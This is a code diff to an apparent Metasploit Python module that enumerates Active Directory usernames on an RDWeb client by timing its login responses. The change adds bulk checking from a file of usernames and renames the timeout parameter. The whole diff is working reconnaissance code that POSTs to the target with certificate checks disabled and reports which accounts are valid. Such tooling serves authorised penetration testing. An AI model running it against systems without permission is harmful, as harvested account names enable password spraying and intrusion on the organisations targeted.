@@ -7,8 +7,9 @@ from metasploit import module
 # extra modules
 dependencies_missing = False
 try:
-    import requests
     import base64
+    import os
+    import requests
 except ImportError:
     dependencies_missing = True
 
@@ -34,7 +35,8 @@ metadata = {
         'rhost': {'type': 'address', 'description': 'Host to target', 'required': True, 'default': None},
         'rport': {'type': 'port', 'description': 'Port to target', 'required': True, 'default': 443},
         'domain': {'type': 'string', 'description': 'The target AD domain', 'required': False, 'default': None},
-        'username': {'type': 'string', 'description': 'The username to verify', 'required': True, 'default': None},
+        'username': {'type': 'string', 'description': 'The username to verify or path to a file of usernames',
+                     'required': True, 'default': None},
         'timeout': {'type': 'int',
                     'description': 'Timeout in milliseconds for response to consider username invalid',
                     'required': True, 'default': 1250},
@@ -65,9 +67,9 @@ def get_ad_domain(rhost, rport):
             return domain
 
 
-def check_username(rhost, rport, targeturi, domain, username, cutoff_time):
+def check_username(rhost, rport, targeturi, domain, username, timeout):
     """Check a single username against the RDWeb Client
-    The cutoff_time is used to specify the amount of milliseconds where a
+    The timeout is used to specify the amount of milliseconds where a
     response should consider the username invalid."""
 
     url = f'https://{rhost}:{rport}/{targeturi}'
@@ -79,16 +81,24 @@ def check_username(rhost, rport, targeturi, domain, username, cutoff_time):
                'Origin': 'https://{rhost}'}
     session = requests.Session()
     try:
-        request = session.post(url, data=body, headers=headers, timeout=cutoff_time / 1000, verify=False)
+        request = session.post(url, data=body, headers=headers, timeout=(timeout / 1000), verify=False)
         if request.status_code == 200:
             module.log(f'Username {domain}\{username} is valid! Response received in {request.elapsed.microseconds / 1000} milliseconds',
                        level='good')
     except requests.exceptions.Timeout:
-            module.log(f'Username {domain}\{username} is invalid! No response received in {cutoff_time} milliseconds',
+            module.log(f'Username {domain}\{username} is invalid! No response received in {timeout} milliseconds',
                        level='error')
     except requests.exceptions.RequestException as e:
         module.log('{}'.format(e), level='error')
         return
+
+
+def check_usernames(rhost, rport, targeturi, domain, username_file, timeout):
+    """Check each username in the provided username file"""
+    with open(username_file, 'r') as file_contents:
+        usernames = file_contents.readlines()
+        for user in usernames:
+            check_username(rhost, rport, targeturi, domain, user.strip(), timeout)
 
 
 def run(args):
@@ -108,9 +118,14 @@ def run(args):
                    level='error')
         return
 
-    # Check the provided username
-    check_username(args['rhost'], args['rport'], args['targeturi'],
-                   domain, args['username'], int(args['cutoff_time']))
+
+    # Check the provided username or file of usernames
+    if os.path.isfile(args['username']):
+        check_usernames(args['rhost'], args['rport'], args['targeturi'],
+                   domain, args['username'], int(args['timeout']))
+    else:
+        check_username(args['rhost'], args['rport'], args['targeturi'],
+                       domain, args['username'], int(args['timeout']))
 
 
 if __name__ == '__main__':
